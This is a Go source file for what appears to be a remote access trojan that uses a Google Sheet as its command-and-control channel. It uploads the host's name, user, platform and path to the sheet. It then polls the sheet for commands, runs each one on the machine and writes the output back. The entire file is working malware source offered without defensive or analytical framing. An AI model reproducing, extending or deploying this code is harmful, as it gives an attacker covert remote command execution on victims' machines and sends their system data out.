package main

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"

	"golang.org/x/net/context"
	"golang.org/x/oauth2"
	"google.golang.org/api/sheets/v4"
	"google.golang.org/api/drive/v3"
	"github.com/gobuffalo/packr"
)

var ctx context.Context

//Spreadsheet template
var rb = &sheets.Spreadsheet{
	Properties: &sheets.SpreadsheetProperties{
		Title: generateUniqueID(),
	},
	Sheets: []*sheets.Sheet{
		{
			Properties: &sheets.SheetProperties{
				SheetId: 1,
				Title:   "MachineInfo",
				GridProperties: &sheets.GridProperties{
					ColumnCount:    2,
					FrozenRowCount: 1,
				},
			},
			Data: []*sheets.GridData{
				{
					StartColumn: 0,
					ColumnMetadata: []*sheets.DimensionProperties{
						{
							PixelSize: 200,
						},
					},
				},
				{
					StartColumn: 1,
					ColumnMetadata: []*sheets.DimensionProperties{
						{
							PixelSize: 600,
						},
					},
				},
				{
					StartColumn: 1,
				},
			},
		},
		{
			Properties: &sheets.SheetProperties{
				SheetId: 2,
				Title:   "C21",
				GridProperties: &sheets.GridProperties{
					ColumnCount:    2,
					FrozenRowCount: 1,
				},
			},
			Data: []*sheets.GridData{
				{
					StartColumn: 0,
					RowData: []*sheets.RowData{
						{
							Values: []*sheets.CellData{
								{
									UserEnteredValue: &sheets.ExtendedValue{
										StringValue: "Commands",
									},
								},
							},
						},
					},
					ColumnMetadata: []*sheets.DimensionProperties{
						{
							PixelSize: 300,
						},
					},
				},
				{
					StartColumn: 1,
					RowData: []*sheets.RowData{
						{
							Values: []*sheets.CellData{
								{
									UserEnteredValue: &sheets.ExtendedValue{
										StringValue: "Results",
									},
								},
							},
						},
					},
					ColumnMetadata: []*sheets.DimensionProperties{
						{
							PixelSize: 900,
						},
					},
				},
				{
					StartColumn: 1,
				},
			},
		},
	},
}

var _ = rb

func getLastRevisionNumber(srv *drive.Service, spreadsheetID string) int {
	//Get all revisions
	revisions, _ := srv.Revisions.List(spreadsheetID).Do()
	totalRevisions := len(revisions.Revisions)

	//return last revision number
	lastRevNumber, _ := strconv.Atoi(revisions.Revisions[totalRevisions-1].Id)
	return lastRevNumber
}

func generateUniqueID() string {
	//Get some info from the machine to create an unique ID
	pid := os.Getpid()
	hostname, _ := os.Hostname()
	currentTime := time.Now().UTC().Format("20060102150405")

	//generate a sha256 of the concatenated info
	hash := sha256.New()
	hash.Write([]byte(strconv.Itoa(pid) + hostname + currentTime))
	md := hex.EncodeToString(hash.Sum(nil))

	return hostname + "_" + md

}

//Return a list of sheet names
func sheetsNames(spreadsheetInfo *sheets.Spreadsheet) []string {
	var sheetsNames []string
	for _, element := range spreadsheetInfo.Sheets {
		data, _ := json.MarshalIndent(element.Properties.Title, "", "")
		//Remove quotes from the sheet name
		sheetsNames = append(sheetsNames, string(data[1:len(data)-1]))
	}
	return sheetsNames
}

func getNewCommands(sheetService *sheets.Service, spreadsheetId, element string) (int, []string) {
	//Set range to both A and B column of the sheet (we need B to see if the command has already been executed)
	range_ := "!A:B"
	firstRow := 0
	var newCommands []string
	//Get both column A and B from the sheet
	spreadsheetValues, err := sheetService.Spreadsheets.Values.Get(spreadsheetId, element+range_).Context(ctx).Do()
	if err != nil {
		log.Fatal(err)
	}

	for index, command := range spreadsheetValues.Values {
		// If the row doesn't have a result (column B), we want to read and store the command to execute (column A)
		if len(command) == 1 {
			//If firstRow is still 0, let's get the row number (so we know the row where to start writing the results)
			if firstRow == 0 {
				firstRow = index
			}
			newCommands = append(newCommands, fmt.Sprint(command[0]))
		}
	}

	return firstRow + 1, newCommands
}

//Execute the command passed
func executeSingleCommand(command string) string {
	parts := strings.Fields(command)
	head := parts[0]
	parts = parts[1:len(parts)]

	res, err := exec.Command(head, parts...).Output()
	if err != nil {
		return err.Error()
	}
	return string(res)

}

var configPath = ""

type SecretClient struct {
	AccessToken   string `json:"access_token"`
	TokenType    string `json:"token_type"`
	RefreshToken string `json:"refresh_token"`
	Expiry        string `json:"expiry"`
}

type Credentials struct {
	Installed struct {
		ClientID                string   `json:"client_id"`
		ProjectID               string   `json:"project_id"`
		AuthURI                 string   `json:"auth_uri"`
		TokenURI                string   `json:"token_uri"`
		AuthProviderX509CertURL string   `json:"auth_provider_x509_cert_url"`
		ClientSecret            string   `json:"client_secret"`
		RedirectUris            []string `json:"redirect_uris"`
	} `json:"installed"`
}

// getWorkingClient uses a Context and Config to retrieve a Token
// then generate a Client. It returns the generated Client.
func getWorkingClient(ctx context.Context) *http.Client {


	//TODO: check getCredentials.go to see how to better handle oAuth tokens. It should be easier than getting values manually
	/*
	The following will handle
	1) relative path - name of the folder inside secrets: go run -ldflags "-X main.configPath=commando" commando.go

	and return only the relative path to the folder. Ie: commando_config in the previous example
	 */


	if configPath == ""{
		configPath = "gorat"
	}

	Box := packr.NewBox("../../secrets")
	clientSecretContent := Box.String(configPath+"/client_secret.json")

	clientSecret := &SecretClient{}
	json.Unmarshal([]byte(clientSecretContent), clientSecret)

	credentialsContent := Box.String(configPath+"/credentials.json")

	credentials := &Credentials{}
	json.Unmarshal([]byte(credentialsContent), credentials)

	config := &oauth2.Config{
		ClientID:     credentials.Installed.ClientID,
		ClientSecret: credentials.Installed.ClientSecret,
		Scopes:       []string{"https://www.googleapis.com/auth/spreadsheets", "https://www.googleapis.com/auth/drive"},
		RedirectURL:  "urn:ietf:wg:oauth:2.0:oob",
		Endpoint: oauth2.Endpoint{
			AuthURL:  credentials.Installed.AuthURI,
			TokenURL: credentials.Installed.TokenURI,
		},
	}

	layout := "2006-01-02T15:04:05.000000000"
	str := "2018-02-26T09:52:12.042163917"
	tokenTime, _ := time.Parse(layout, str)

	tok := &oauth2.Token{

		AccessToken:  clientSecret.AccessToken,
		TokenType:    clientSecret.TokenType,
		RefreshToken: clientSecret.RefreshToken,
		Expiry:       tokenTime,
		//Expiry:       clientSecret.Expiry,
	}
	return config.Client(ctx, tok)
}

func main() {
	ctx := context.Background()
	client := getWorkingClient(ctx)
	sheetService, err := sheets.New(client)
	if err != nil {
		log.Fatalf("Unable to retrieve Sheets Client %v", err)
	}

	//create new document

	resp, err := sheetService.Spreadsheets.Create(rb).Context(ctx).Do()
	if err != nil {
		log.Fatal(err)
	}

	spreadsheetId := resp.SpreadsheetId

	//Write basic info
	var basicInfo sheets.ValueRange

	hostname, _ := os.Hostname()
	user, _ := user.Current()
	currPath, _ := os.Getwd()

	basicInfo.Values = append(basicInfo.Values, []interface{}{"Hostname", hostname})
	basicInfo.Values = append(basicInfo.Values, []interface{}{"PID", strconv.Itoa(os.Getpid())})
	basicInfo.Values = append(basicInfo.Values, []interface{}{"Current Time", time.Now().UTC().Format("20060102150405")})
	basicInfo.Values = append(basicInfo.Values, []interface{}{"Username", user.Username})
	basicInfo.Values = append(basicInfo.Values, []interface{}{"Platform", runtime.GOOS})
	basicInfo.Values = append(basicInfo.Values, []interface{}{"Current Path", currPath})

	// How the input data should be interpreted.
	valueInputOption := "USER_ENTERED" // TODO: Update placeholder value.

	_, _ = sheetService.Spreadsheets.Values.Update(spreadsheetId, "MachineInfo!A:B", &basicInfo).ValueInputOption(valueInputOption).Context(ctx).Do()

	//APIv3 - use drive.New instead of sheets.New
	srv, err := drive.New(client)
	if err != nil {
		log.Fatalf("Unable to retrieve drive Client %v", err)
	}

	lastRevNumber := getLastRevisionNumber(srv, spreadsheetId)

	for {
		//Check if the revision number is the same (any changes to the sheet?)
		newRevisionNumber := getLastRevisionNumber(srv, spreadsheetId)
		if newRevisionNumber == lastRevNumber {
			fmt.Printf("Nothing new\n")
			time.Sleep(3 * time.Second)
		} else {
			//Spreadsheet changed
			fmt.Println("Something happened")
			ranges := []string{}
			includeGridData := true

			//Read spreadsheet info
			spreadsheetInfo, _ := sheetService.Spreadsheets.Get(spreadsheetId).Ranges(ranges...).IncludeGridData(includeGridData).Context(ctx).Do()
			if err != nil {
				log.Fatal(err)
			}

			//Get all sheets
			sheetsNames := sheetsNames(spreadsheetInfo)

			//For each sheet
			for _, sheetsName := range sheetsNames {
				//If it's the first sheet, we don't need to read any command from here
				if sheetsName != "MachineInfo" {

					//if not first sheet, read new commands
					nextRow, newCommands := getNewCommands(sheetService, spreadsheetId, sheetsName)

					//Where to write
					range2 := sheetsName + "!B" + strconv.Itoa(nextRow) + ":B"

					//if command list not empty
					if len(newCommands) != 0 {
						var vr sheets.ValueRange
						//execute and get command results
						for _, singleCommand := range newCommands {
							//commandResults = append(commandResults, executeSingleCommand(singleCommand))
							myval := []interface{}{executeSingleCommand(singleCommand)}
							vr.Values = append(vr.Values, myval)
						}

						// How the input data should be interpreted.
						valueInputOption := "USER_ENTERED" // TODO: Update placeholder value.

						resp, err := sheetService.Spreadsheets.Values.Update(spreadsheetId, range2, &vr).ValueInputOption(valueInputOption).Context(ctx).Do()
						if err != nil {
							log.Fatal(err)
						}
						_ = resp

					}
				}
			}
			//Update local revision number after the changes
			lastRevNumber = getLastRevisionNumber(srv, spreadsheetId)
		}
	}
}
